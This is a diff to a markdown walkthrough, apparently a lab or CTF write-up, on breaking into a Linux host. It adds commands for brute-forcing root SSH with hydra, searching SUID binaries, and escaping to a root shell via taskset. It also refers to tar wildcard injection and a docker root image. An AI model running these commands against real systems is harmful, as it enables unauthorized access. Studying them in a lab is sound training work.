@@ -115,7 +115,7 @@ Other commands who need more step:
 
 ### curl
 
-curl need two pc to work, we can use the perl method above in a script.  
+We can use the perl method above in a script.  
 On your pc, write the `shell.sh`:
 
 ```sh
@@ -194,8 +194,9 @@ PermitRootLogin yes
 ```
 We can bruteforce ssh too with `root`, with a nice dictionnary (there are somes dictionnary at [github](https://github.com/danielmiessler/SecLists/tree/master/Passwords):
 
-    $ wget -cv https://github.com/danielmiessler/SecLists/raw/master/Passwords/darkc0de.txt
-    $ hydra -t 4 -l root -P darkc0de.txt 192.168.1.14 ssh
+    $ hydra -t 4 -l root -P rockyou-75.txt 192.168.1.14 ssh
+
+4 hour after, the command run again, not sure this dictionnary will work on the ssh :(
 
 ### Tar wildcard injection
 
@@ -208,7 +209,7 @@ Look this file:
 
      $ cat /etc/cron.daily/backup
 
-The script make backup of all user from `/home` at `/etc/backups/`.
+The script make backup of all user from `/home` at `/etc/backups/` with `tar`.
 
     $ ls /etc/backups
     home-bob.tgz  home-peter.tgz  home-susan.tgz
@@ -252,13 +253,17 @@ For docker, we can use [rootplease](https://hub.docker.com/r/chrisfosterelli/roo
 
 A look at [g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) to find a command to search suid file:
 
-     $ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
-     
-Compare with [gtfobin](https://gtfobins.github.io), theses programs can be exploit:
-
+     $ find / -perm -u=s -type f -exec ls -ld {} \; 2>/dev/null
      -rwsr-x--- 1 root itservices 18552 Apr 10  2018 /usr/bin/xxd
+     -rwsr-sr-x 1 root root 30800 May 16 10:41 /usr/bin/taskset
      
-A group itservices... Which user is part of it.
+Search each commands on [gtfobin](https://gtfobins.github.io), only 2 will serve us.
+
+First `taskset`:
+
+    $ taskset 1 /bin/sh -p
+     
+And `xxd` is owned by a group `itservices`... Which user is part of it.
 
     $ grep itservices /etc/group
     itservices:x:1007:susan
